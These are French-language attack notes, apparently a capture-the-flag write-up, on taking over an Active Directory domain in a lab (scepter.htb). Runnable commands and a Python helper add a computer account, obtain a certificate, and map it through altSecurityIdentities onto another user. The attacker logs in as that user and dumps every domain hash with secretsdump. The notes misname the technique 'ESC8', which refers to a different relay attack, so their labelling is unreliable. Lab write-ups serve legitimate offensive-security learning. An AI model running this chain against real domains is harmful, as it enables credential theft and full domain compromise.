# ESC8

***

## <mark style="color:red;">🧬 Attaque ADCS via</mark> <mark style="color:red;"></mark><mark style="color:red;">`altSecurityIdentities`</mark>

#### 🎯 Objectif : Forger une identité Kerberos en liant un certificat à un utilisateur Active Directory

***

### <mark style="color:blue;">🧠 Qu’est-ce que</mark> <mark style="color:blue;"></mark><mark style="color:blue;">`altSecurityIdentities`</mark> <mark style="color:blue;"></mark><mark style="color:blue;">?</mark>

`altSecurityIdentities` est un **attribut LDAP d’un objet utilisateur AD**.

Il permet à un utilisateur de **s’authentifier avec un certificat X.509** (comme une carte à puce, ou un certificat émis par le CA interne).\
C’est utilisé en **authentification SmartCard** (PKINIT).

⚠️ Sauf que… **rien n’empêche un admin (ou un attaquant avec les bons droits) de forger ce champ à la main pour mapper&#x20;**_**n’importe quel certificat**_**&#x20;à n’importe quel compte.**

***

### <mark style="color:red;">📍 Prérequis pour l’attaque</mark>

1. 🔑 Posséder un **certificat X.509 + clé privée** valide émis par **le même CA** que celui configuré dans AD.
2. 🧑‍💼 Avoir un compte qui peut modifier un utilisateur AD cible (`Set-ADUser`, `GenericAll`, `Write altSecurityIdentities`, etc.).
3. ✅ Le certificat doit contenir les bons `Issuer` et `Serial Number` pour que la correspondance fonctionne.

***

### <mark style="color:red;">🧾 Étapes détaillées de l’attaque</mark>

***

#### <mark style="color:green;">① Créer un nouvel ordinateur (Computer Account) via</mark> <mark style="color:green;"></mark><mark style="color:green;">`bloodyAD`</mark>

```bash
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Password123' --dc-ip 10.10.11.65 add computer meow 'Password123'
```

➡️ Cela crée `meow$` avec un mot de passe défini.

***

#### <mark style="color:green;">② Demander un certificat Machine avec</mark> <mark style="color:green;"></mark><mark style="color:green;">`certipy`</mark>

```bash
certipy-ad req \
  -ca scepter-DC01-CA \
  -template Machine \
  -target 10.10.11.65 \
  -username meow$ \
  -password 'Password123'
```

➡️ Résultat : un certificat `.pfx` émis pour `meow.scepter.htb`.

***

#### <mark style="color:green;">③ Extraire le certificat</mark> <mark style="color:green;"></mark><mark style="color:green;">`.crt`</mark> <mark style="color:green;"></mark><mark style="color:green;">avec OpenSSL</mark>

```bash
certipy-ad cert -pfx meow.pfx -nokey -out meow.crt
openssl x509 -in meow.crt -noout -text
```

➡️ On récupère :

* **Issuer**
* **Serial Number**

Exemple :

```
Issuer: CN=scepter-DC01-CA,DC=scepter,DC=htb
Serial Number: 62:00:00:00:0e:2d:24:d9:92:4d:f7:a4:cc:00:00:00:00:00:0e
```

***

#### <mark style="color:green;">④ Convertir le X.509 → format</mark> <mark style="color:green;"></mark><mark style="color:green;">`altSecurityIdentities`</mark>

> Format attendu : `X509:<I>{Issuer}<SR>{Serial Reversed}`

Script utilisé :

```python
# conv.py
import sys
def parse_serial(hex_serial):
    hex_serial = hex_serial.replace(":", "")
    bytes_reversed = [hex_serial[i:i+2] for i in range(0, len(hex_serial), 2)][::-1]
    return ''.join(bytes_reversed).lower()

def format_altsecid(issuer, serial):
    issuer_parts = [p.strip() for p in issuer.split(',')[::-1]]
    return f'X509:<I>{','.join(issuer_parts)}<SR>{parse_serial(serial)}'

if __name__ == "__main__":
    serial = sys.argv[sys.argv.index("-serial")+1]
    issuer = sys.argv[sys.argv.index("-issuer")+1]
    print(format_altsecid(issuer, serial))
```

Exécution :

```bash
python3 conv.py -serial '62:00:00:00:0e:2d:24:d9:92:4d:f7:a4:cc:00:00:00:00:00:0e' \
                -issuer 'CN=scepter-DC01-CA,DC=scepter,DC=htb'
```

➡️ Donne :

```
X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>0e0000000000cca4f74d92d9242d0e00000062
```

***

#### <mark style="color:green;">⑤ Injecter ce mapping sur le user cible</mark>

```powershell
Set-ADUser p.adams -Replace @{altSecurityIdentities='X509:<I>DC=htb,DC=scepter,CN=scepter-DC01-CA<SR>0e0000000000cca4f74d92d9242d0e00000062'}
```

⚠️ Cela signifie que **tout certificat ayant cet Issuer + Serial peut s’authentifier comme `p.adams`**.

***

#### <mark style="color:green;">⑥ Utiliser</mark> <mark style="color:green;"></mark><mark style="color:green;">`certipy`</mark> <mark style="color:green;"></mark><mark style="color:green;">pour s’auth comme</mark> <mark style="color:green;"></mark><mark style="color:green;">`p.adams`</mark>

```bash
certipy-ad auth -pfx meow.pfx -dc-ip 10.10.11.65 -username p.adams
```

Même si ce certificat est pour `meow$`, comme il est **mappé via altSecurityIdentities à `p.adams`**, le KDC le considère comme valide.

***

#### <mark style="color:green;">⑦ Récupérer les secrets (hash NTLM ou secretsdump)</mark>

```bash
python3 secretsdump.py -just-dc -hashes aad3b4...:1b92... scepter.htb/p.adams@10.10.11.65
```

➡️ Tu dumpes `Administrator`, `krbtgt`, tout le NTDS.DIT.

***

### <mark style="color:blue;">🧪 Schéma ASCII de l’attaque ESC8</mark>

```
Attaquant (a.carter)                      ADCS Server / CA                  KDC (dc01.scepter.htb)
        |                                        |                                  |
        |-- forge computer (meow$) -------------->                                  |
        |                                        |                                  |
        |-- request cert for meow$ -------------->                                  |
        |<- receives X.509 + key (meow.pfx) <-----                                  |
        |                                        |                                  |
        |-- extract Issuer/Serial                |                                  |
        |-- set altSecurityIdentities=p.adams --|--> LDAP modif user p.adams       |
        |                                        |                                  |
        |-- use certipy-auth as p.adams --------> Cert valid via altSecID          |
        |                                        |<------------- TGT ---------------|
        |                                        |                                  |
        |-- dump secrets w/ p.adams access ---------------------------------------> |
```

***

* [🎓 ESC8 on Certified Pre-Owned (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
* [🔧 Certipy Wiki ESC8](https://github.com/ly4k/Certipy/wiki/ESC8)
* [🛠️ ADCS Attacks Overview](https://github.com/dirkjanm/PKINITtools)

***
